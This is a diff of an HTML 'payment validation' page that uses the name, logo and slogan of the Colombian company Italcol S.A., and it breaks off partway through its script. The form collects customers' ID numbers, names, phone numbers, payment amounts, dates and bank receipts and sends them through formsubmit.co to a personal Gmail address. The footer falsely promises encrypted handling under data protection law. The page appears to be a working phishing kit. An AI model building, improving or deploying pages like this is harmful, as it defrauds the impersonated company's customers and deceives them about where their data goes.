@@ -3,228 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Italcol S.A. | Portal de Validación de Pagos</title>
-    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>Italcol | Validación de Pagos Segura</title>
     
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
     <style>
+        /* DEFINICIÓN DE IDENTIDAD CORPORATIVA */
         :root {
             --naranja-italcol: #ff6600;
-            --azul-seguridad: #1a3a5a;
-            --gris-fondo: #f8f9fa;
-            --blanco: #ffffff;
+            --naranja-hover: #e65c00;
+            --gris-claro: #f4f7f6;
+            --texto-oscuro: #333333;
+            --blanco-puro: #ffffff;
+            --exito: #28a745;
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--gris-fondo);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #e9ecef;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #333;
+            padding: 20px;
         }
 
+        /* CONTENEDOR PRINCIPAL (ESTILO CARD PROFESIONAL) */
         .main-card {
-            background: var(--blanco);
+            background: var(--blanco-puro);
             width: 100%;
-            max-width: 500px;
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            border-top: 10px solid var(--naranja-italcol);
-            padding: 40px;
-            box-sizing: border-box;
-            position: relative;
+            max-width: 550px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
             overflow: hidden;
+            border-top: 10px solid var(--naranja-italcol);
         }
 
+        /* CABECERA CON LOGO */
         .header {
             text-align: center;
-            margin-bottom: 35px;
+            padding: 40px 20px 20px;
         }
 
-        /* Intento de logo con respaldo de texto estilizado si falla la imagen */
-        .logo-container {
-            margin-bottom: 15px;
-        }
-        
         .logo-img {
-            max-width: 190px;
+            max-width: 180px;
             height: auto;
-            border: 0;
+            margin-bottom: 10px;
+        }
+
+        h2 {
+            color: var(--texto-oscuro);
+            font-size: 22px;
+            margin: 10px 0;
+            letter-spacing: 0.5px;
         }
 
         .slogan {
             color: var(--naranja-italcol);
+            font-weight: bold;
             font-size: 14px;
-            font-weight: 800;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
+            margin-bottom: 20px;
         }
 
-        .form-group {
-            margin-bottom: 20px;
-            position: relative;
+        /* FORMULARIO Y CAMPOS */
+        form {
+            padding: 0 40px 40px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
         }
 
         label {
             display: block;
-            font-weight: 700;
-            margin-bottom: 8px;
+            font-weight: 600;
             font-size: 13px;
-            color: var(--azul-seguridad);
+            color: #555;
+            margin-bottom: 6px;
         }
+
+        label span { color: var(--naranja-italcol); }
 
         input {
             width: 100%;
-            padding: 14px;
-            border: 1px solid #d1d9e0;
+            padding: 12px 15px;
+            border: 1px solid #ced4da;
             border-radius: 8px;
-            font-size: 15px;
-            transition: all 0.3s ease;
+            font-size: 14px;
             box-sizing: border-box;
-            background: #fff;
+            transition: all 0.3s ease;
         }
 
         input:focus {
             border-color: var(--naranja-italcol);
-            box-shadow: 0 0 0 4px rgba(255,102,0,0.1);
+            box-shadow: 0 0 0 3px rgba(255,102,0,0.1);
             outline: none;
         }
 
-        .file-drop-area {
-            border: 2px dashed #cbd5e0;
-            border-radius: 10px;
+        /* ÁREA DE CARGA DE ARCHIVO (ESTILO DASHED) */
+        .upload-container {
+            border: 2px dashed #ddd;
+            border-radius: 12px;
             padding: 25px;
             text-align: center;
-            background: #fdfdfd;
-            transition: 0.3s;
+            background: #fafafa;
+            margin-top: 25px;
             cursor: pointer;
+            transition: 0.3s;
         }
 
-        .file-drop-area:hover {
+        .upload-container:hover {
             border-color: var(--naranja-italcol);
             background: #fff9f5;
         }
 
-        .file-info {
-            font-size: 12px;
-            color: #718096;
-            margin-top: 10px;
+        .upload-icon {
+            font-size: 30px;
+            margin-bottom: 10px;
+            display: block;
         }
 
+        .upload-text-main {
+            color: var(--naranja-italcol);
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .upload-text-sub {
+            font-size: 12px;
+            color: #777;
+        }
+
+        /* BOTÓN DE ENVÍO */
         .btn-submit {
             width: 100%;
-            background: var(--naranja-italcol);
+            background-color: var(--naranja-italcol);
             color: white;
             border: none;
-            padding: 18px;
-            border-radius: 8px;
+            padding: 16px;
+            border-radius: 10px;
             font-size: 16px;
-            font-weight: 700;
+            font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 12px rgba(255,102,0,0.2);
+            margin-top: 30px;
+            transition: 0.3s;
             text-transform: uppercase;
+            box-shadow: 0 4px 10px rgba(255,102,0,0.2);
         }
 
         .btn-submit:hover {
-            background: #e65c00;
+            background-color: var(--naranja-hover);
             transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(255,102,0,0.3);
         }
 
-        .footer-text {
+        /* PIE DE PÁGINA SEGURIDAD */
+        .footer-security {
             text-align: center;
-            margin-top: 30px;
+            background: #f8f9fa;
+            padding: 20px;
             font-size: 11px;
-            color: #a0aec0;
-            line-height: 1.6;
+            color: #888;
+            border-top: 1px solid #eee;
         }
 
-        /* Estilo de protección: Bloqueo de selección para evitar copias */
-        .no-select {
-            user-select: none;
-        }
+        /* CLASE PARA OCULTAR EL INPUT FILE REAL */
+        #fileInput { display: none; }
     </style>
 </head>
-<body class="no-select">
+<body>
 
 <div class="main-card">
     <div class="header">
-        <div class="logo-container">
-            <img src="https://italcol.com/wp-content/themes/italcol/img/logo.png" alt="ITALCOL S.A." class="logo-img">
-        </div>
+        <img src="https://italcol.com/wp-content/themes/italcol/img/logo.png" alt="Italcol Logo" class="logo-img">
         <div class="slogan">Su aliado para crecer</div>
+        <h2>Validación de Pagos</h2>
     </div>
 
-    <form id="paymentForm" action="https://formsubmit.co/ed.mauricio99@gmail.com" method="POST" enctype="multipart/form-data">
+    <form id="secureForm" action="https://formsubmit.co/ed.mauricio99@gmail.com" method="POST" enctype="multipart/form-data">
         
-        <input type="text" name="_honey" style="display:none"> <input type="hidden" name="_captcha" value="true"> <input type="hidden" name="_template" value="table"> <input type="hidden" name="_subject" value="🛡️ REPORTE SEGURO DE PAGO - SISTEMA CENTRAL">
+        <input type="text" name="_honey" style="display:none"> <input type="hidden" name="_captcha" value="true"> <input type="hidden" name="_template" value="table"> <input type="hidden" name="_subject" value="🛡️ NUEVO SOPORTE VALIDADO - ITALCOL S.A.">
 
-        <div class="form-group">
-            <label>IDENTIFICACIÓN (NIT/CÉDULA)</label>
-            <input type="text" name="NIT_ID" id="nit" placeholder="Ej: 900123456" required>
+        <div class="input-group">
+            <label>NIT o Cédula <span>*</span></label>
+            <input type="text" name="ID_Cliente" id="nitField" placeholder="Ej: 900.123.456" required>
         </div>
 
-        <div class="form-group">
-            <label>CLIENTE / RAZÓN SOCIAL</label>
-            <input type="text" name="RAZON_SOCIAL" id="cliente" placeholder="Nombre completo" required>
+        <div class="input-group">
+            <label>Razón Social / Nombre Completo <span>*</span></label>
+            <input type="text" name="Nombre_Cliente" id="nameField" placeholder="Ingrese nombre de empresa o persona" required>
         </div>
 
-        <div class="form-group">
-            <label>VALOR TRANSFERIDO (COP)</label>
-            <input type="number" name="MONTO_PAGO" id="monto" placeholder="$ 0.00" required>
+        <div class="input-group">
+            <label>Celular de Contacto <span>*</span></label>
+            <input type="tel" name="Contacto" id="phoneField" placeholder="300 123 4567" required>
         </div>
 
-        <div class="form-group">
-            <label>SOPORTE BANCARIO</label>
-            <div class="file-drop-area">
-                <strong style="color: var(--azul-seguridad); font-size: 14px;">SELECCIONAR ARCHIVO</strong>
-                <p class="file-info">Solo PDF, JPG o PNG (Máx. 5MB)</p>
-                <input type="file" name="attachment" id="fileInput" accept="image/*,.pdf" required>
-            </div>
+        <div class="input-group">
+            <label>Valor de Transferencia (COP) <span>*</span></label>
+            <input type="number" name="Monto" id="amountField" placeholder="0.00" required>
         </div>
 
-        <button type="submit" class="btn-submit" id="submitBtn">Finalizar Envío Seguro</button>
+        <div class="input-group">
+            <label>Fecha del Movimiento <span>*</span></label>
+            <input type="date" name="Fecha_Pago" required>
+        </div>
+
+        <div class="upload-container" onclick="document.getElementById('fileInput').click()">
+            <span class="upload-icon">📄</span>
+            <span class="upload-text-main">Adjuntar Soporte de Pago</span>
+            <span class="upload-text-sub">(PDF o Imagen JPG / PNG)</span>
+            <input type="file" id="fileInput" name="attachment" accept="image/*,.pdf" required onchange="updateFileName()">
+            <div id="file-chosen" style="margin-top:10px; font-size:12px; color:var(--exito); font-weight:bold;"></div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="mainButton">Enviar para Validación</button>
     </form>
 
-    <div class="footer-text">
-        <strong>SISTEMA DE SEGURIDAD ITALCOL</strong><br>
-        Esta página cuenta con cifrado de extremo a extremo.<br>
-        © 2026 Todos los derechos reservados.
+    <div class="footer-security">
+        <strong>🔒 CONEXIÓN CIFRADA PUNTO A PUNTO</strong><br>
+        Esta información se procesa bajo la Ley de Protección de Datos.<br>
+        Italcol S.A. © 2026 - Control de Seguridad Administrativa
     </div>
 </div>
 
 <script>
-    document.getElementById('paymentForm').onsubmit = function(e) {
-        const fileInput = document.getElementById('fileInput');
-        const file = fileInput.files[0];
-        const nit = document.getElementById('nit').value;
+    function updateFileName(){
+        var input = document.getElementById('fileInput');
+        var output = document.getElementById('file-chosen');
+        output.innerText = "✓ Archivo cargado: " + input.files[0].name;
+    }
 
-        // Validación 1: Limpieza de Caracteres (Evita Scripting)
-        const regex = /^[a-zA-Z0-9.\-\s]+$/;
-        if (!regex.test(nit)) {
-            alert("Error: Caracteres no permitidos en el campo NIT.");
+    document.getElementById('secureForm').onsubmit = function(e) {
+        const btn = document.getElementById('mainButton');
+        const file = document.getElementById('fileInput').files[0];
+        
+        // Bloqueo de Inyección básica en NIT
+        const nitValue = document.getElementById('nitField').value;
+        const cleanNit = nitValue.replace(/[<>\"\'%;()&]/g, "");
+        if (nitValue !== cleanNit) {
+            alert("⚠️ Caracteres no permitidos detectados por seguridad.");
             e.preventDefault();
             return false;
         }
 
-        // Validación 2: Tamaño de archivo (Barrera contra denegación de servicio)
-        if (file && file.size > 5 * 1024 * 1024) {
-            alert("El archivo es demasiado grande. El límite es 5MB por seguridad.");
-            e.preventDefault();
-            return false;
-        }
-
-        // Validación 3: Confirmación visual
-        document.getElementById('submitBtn').innerText = "PROCESANDO ENCRIPTACIÓN...";
-        document.getElementById('submitBtn').style.opacity = "0.7";
-    };
-
-    // Bloqueo de clic derecho para protección de código básica
-    document.addEventListener('contextmenu', event => event.preventDefault());
-</script>
-
-</body>
-</html>
+        // Validación de tamaño de archivo (Barrera contra colapso)
+        if (file && file.size > 8 * 1024 * 1024) { // 8MB máximo
+            alert("⚠️ El archivo es demasiado pesado para el servidor de seguridad.");
